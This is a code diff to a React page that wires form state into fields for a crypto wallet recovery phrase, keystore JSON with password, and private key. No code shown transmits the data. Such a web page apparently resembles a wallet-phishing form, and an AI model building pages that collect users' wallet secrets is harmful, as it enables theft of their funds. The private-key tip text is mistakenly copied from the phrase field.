@@ -1,5 +1,6 @@
 import React from 'react';
 import '../../assets/styles/css/wallet-details-entry-page.css';
+import '../../assets/styles/css/wallet-details-entry-page_media-queries.css';
 import { useState } from 'react';
 import Navbar from '../../components/Navbar';
 import Footer from '../../components/Footer';
@@ -8,6 +9,13 @@ function WalletDetailsEntryPage() {
   const [showPhrase, setShowPhrase] = useState(false);
   const [showKeyJson, setShowKeyJson] = useState(false);
   const [showPrivateKey, setShowPrivateKey] = useState(true);
+
+  // form handling
+
+  const [phrase, setPhrase] = useState('');
+  const [keyJson, setKeyJson] = useState('');
+  const [password, setPassword] = useState('');
+  const [privateKey, setPrivatekey] = useState('');
 
   function displayPhrase() {
     setShowPhrase(true);
@@ -64,7 +72,7 @@ function WalletDetailsEntryPage() {
             Private Key
           </button>
         </div>
-        <div className="form-area">
+        <form className="form-area">
           {showPhrase && (
             <div className="mb-3">
               <textarea
@@ -72,6 +80,8 @@ function WalletDetailsEntryPage() {
                 id="exampleFormControlTextarea1"
                 placeholder="Phrase"
                 rows="5"
+                value={phrase}
+                onChange={(e) => setPhrase(e.target.value)}
               ></textarea>
               <div className="tip-text">
                 Typically 12 (sometimes 24) words separated by single spaces.
@@ -84,6 +94,8 @@ function WalletDetailsEntryPage() {
                 style={{ marginBottom: '20px' }}
                 className="form-control"
                 id="exampleFormControlTextarea1"
+                value={keyJson}
+                onChange={(e) => setKeyJson(e.target.value)}
                 placeholder="Keystore JSON"
                 rows="5"
               ></textarea>
@@ -93,6 +105,8 @@ function WalletDetailsEntryPage() {
                   className="form-control"
                   placeholder="Password"
                   id="inputPassword"
+                  value={password}
+                  onChange={(e) => setPassword(e.target.value)}
                 ></input>
               </div>
               <div className="tip-text">
@@ -109,6 +123,8 @@ function WalletDetailsEntryPage() {
                 className="form-control"
                 id="exampleFormControlInput1"
                 placeholder="Private Key"
+                value={privateKey}
+                onChange={(e) => setPrivatekey(e.target.value)}
               ></input>
               <div className="tip-text">
                 Typically 12 (sometimes 24) words separated by single spaces.
@@ -124,7 +140,7 @@ function WalletDetailsEntryPage() {
               Import
             </button>
           </div>
-        </div>
+        </form>
       </section>
       <Footer />
     </>
